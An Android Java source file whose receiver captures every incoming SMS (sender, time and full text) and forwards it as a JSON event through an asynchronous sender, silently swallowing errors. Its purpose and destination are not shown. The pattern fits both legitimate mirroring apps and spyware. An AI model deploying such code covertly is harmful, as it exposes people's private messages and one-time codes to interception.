package com.nexus.collector;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;

import org.json.JSONObject;

public final class NexusSmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (context == null || intent == null || !NexusConfig.enabled(context)) return;
        try {
            SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
            if (messages == null || messages.length == 0) return;
            StringBuilder body = new StringBuilder();
            String sender = null;
            long timestamp = 0L;
            for (SmsMessage msg : messages) {
                if (msg == null) continue;
                if (sender == null) sender = msg.getDisplayOriginatingAddress();
                if (timestamp == 0L) timestamp = msg.getTimestampMillis();
                body.append(msg.getMessageBody());
            }
            String text = body.toString().trim();
            if (text.isEmpty()) return;
            JSONObject event = NexusJson.baseEvent(NexusJson.iso(timestamp), "SMS", "sms", sender, sender, text);
            JSONObject visual = new JSONObject();
            visual.put("app_name", "SMS");
            visual.put("package", "android.provider.Telephony.SMS_RECEIVED");
            visual.put("notification_priority", "direct");
            visual.put("has_attachment_hint", false);
            event.put("visual", visual);
            NexusConfig.increment(context, "sms_count");
            NexusEventSender.sendAsync(context, event.toString());
        } catch (Exception ignored) {}
    }
}
